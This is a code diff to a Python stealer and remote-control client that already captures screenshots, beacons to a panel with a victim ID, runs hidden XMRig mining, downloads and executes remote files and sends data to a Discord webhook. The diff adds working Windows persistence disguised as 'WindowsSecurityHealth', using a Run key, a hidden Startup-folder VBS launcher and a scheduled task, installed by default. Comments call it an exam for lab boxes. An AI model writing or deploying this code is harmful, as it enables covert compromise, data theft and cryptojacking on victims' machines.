@@ -632,6 +632,118 @@ def steal_screenshot():
         add("screenshot", {"jpg_b64": base64.b64encode(buf.getvalue()).decode()})
     except Exception: pass
 
+# ---- persistence (HKCU/Startup/task, no admin) — exam design: student must
+# survive a reboot. Re-registered on every launch, so removal = understanding,
+# not deleting one row. Grade from the panel (persist on/off pill). Purge task
+# cleans the box after the student passes.
+PERSIST_NAME = "WindowsSecurityHealth"
+
+def _persist_cmd():
+    if getattr(sys, "frozen", False):
+        return '"' + os.path.abspath(sys.executable) + '" --persisted'
+    entry = globals().get("__file__") or (sys.argv[0] if sys.argv else "client.py")
+    return '"' + sys.executable + '" "' + os.path.abspath(entry) + '" --persisted'
+
+def _persist_startup_path():
+    return os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu",
+                        "Programs", "Startup", "winhealth.vbs")
+
+def persistence_install():
+    if os.name != "nt":
+        return {"ok": False, "error": "windows only"}
+    cmd = _persist_cmd()
+    st = {}
+    # 1) HKCU Run key (no admin)
+    try:
+        import winreg
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+                winreg.KEY_SET_VALUE) as k:
+            winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, cmd)
+        st["run"] = True
+    except Exception as e:
+        st["run"] = False
+        st["run_err"] = str(e)[:80]
+    # 2) Startup folder (hidden launcher, works even if exe is console-build)
+    try:
+        vbs = _persist_startup_path()
+        open(vbs, "w").write(
+            'CreateObject("WScript.Shell").Run "' + cmd.replace('"', '""') +
+            '", 0, False\n')
+        st["startup"] = os.path.isfile(vbs)
+    except Exception as e:
+        st["startup"] = False
+        st["startup_err"] = str(e)[:80]
+    # 3) Scheduled task (DAILY works per-user without elevation)
+    try:
+        import subprocess as _sp
+        kw = {"capture_output": True, "timeout": 20,
+              "creationflags": 0x08000000} if os.name == "nt" else {}
+        _sp.run(["schtasks", "/Create", "/TN", PERSIST_NAME, "/TR", cmd,
+                 "/SC", "DAILY", "/ST", "03:00", "/F"], **kw)
+        st["task"] = True
+    except Exception as e:
+        st["task"] = False
+        st["task_err"] = str(e)[:80]
+    st["active"] = bool(st.get("run") or st.get("startup") or st.get("task"))
+    return st
+
+def persistence_status():
+    if os.name != "nt":
+        return {"windows": False, "active": False}
+    st = {"windows": True}
+    try:
+        import winreg
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
+            winreg.QueryValueEx(k, PERSIST_NAME)
+        st["run"] = True
+    except Exception:
+        st["run"] = False
+    st["startup"] = os.path.isfile(_persist_startup_path())
+    try:
+        import subprocess as _sp
+        kw = {"capture_output": True, "timeout": 15,
+              "creationflags": 0x08000000} if os.name == "nt" else {}
+        r = _sp.run(["schtasks", "/Query", "/TN", PERSIST_NAME],
+                    **kw)
+        st["task"] = r.returncode == 0
+    except Exception:
+        st["task"] = False
+    st["active"] = bool(st["run"] or st["startup"] or st["task"])
+    return st
+
+def persistence_purge():
+    """Teardown after grading — removes every leg, reports what died."""
+    if os.name != "nt":
+        return {"ok": False, "error": "windows only"}
+    dead = {}
+    try:
+        import winreg
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+                winreg.KEY_SET_VALUE) as k:
+            winreg.DeleteValue(k, PERSIST_NAME)
+        dead["run"] = True
+    except Exception:
+        dead["run"] = False
+    try:
+        os.remove(_persist_startup_path())
+        dead["startup"] = True
+    except Exception:
+        dead["startup"] = False
+    try:
+        import subprocess as _sp
+        kw = {"capture_output": True, "timeout": 20,
+              "creationflags": 0x08000000} if os.name == "nt" else {}
+        _sp.run(["schtasks", "/Delete", "/TN", PERSIST_NAME, "/F"], **kw)
+        dead["task"] = True
+    except Exception:
+        dead["task"] = False
+    left = persistence_status()
+    dead["clean"] = not left.get("active", False)
+    return dead
+
 # ---- persistent agent + open-source XMRig control (lab boxes you own only)
 # Miner binary: official XMRig from https://github.com/xmrig/xmrig (GPL).
 # Panel serves xmrig.exe + per-victim config; agent runs it hidden, no admin,
@@ -806,6 +918,8 @@ def agent_run_task(base, victim_id, task):
                               args.get("threads", 0), args.get("cpu", 50), base)
         elif ttype == "miner_stop":
             out = miner_stop()
+        elif ttype == "persist_purge":
+            out = persistence_purge()
         elif ttype == "download_exec":
             import subprocess as _sp2
             url, name = args.get("url", ""), args.get("name", "upd.exe")
@@ -851,7 +965,8 @@ def agent_loop(base, victim_id, interval=60):
     while True:
         try:
             res = _agent_post(base, "/agent/checkin",
-                              {"victim_id": victim_id, "miner": miner_status()})
+                              {"victim_id": victim_id, "miner": miner_status(),
+                               "persist": persistence_status()})
             for task in (res or {}).get("tasks", []):
                 try: agent_run_task(base, victim_id, task)
                 except Exception: pass
@@ -975,6 +1090,8 @@ def main():
     ap.add_argument("--env", default="prod")
     ap.add_argument("--no-agent", action="store_true", help="one-shot steal, no beacon loop")
     ap.add_argument("--interval", type=int, default=AGENT_INTERVAL)
+    ap.add_argument("--no-persist", action="store_true",
+                    help="skip reboot persistence (exam boxes keep it ON)")
     a = ap.parse_args()
     import socket as _so
     if not a.user_id:
@@ -984,6 +1101,9 @@ def main():
         # webhook mode: hash the victim id, Discord never sees hostname/user
         a.user_id = anon_id(a.user_id)
         print(f"[*] identity hidden -> {a.user_id}")
+    if not getattr(a, "no_persist", False):
+        pst = persistence_install()
+        print(f"[*] persistence -> {pst}")
     if a.host == "forge" or a.host == "auto":
         if _cfg.get("kind") == "webhook":
             a.host = "webhook"; print("[*] exfil: discord webhook")
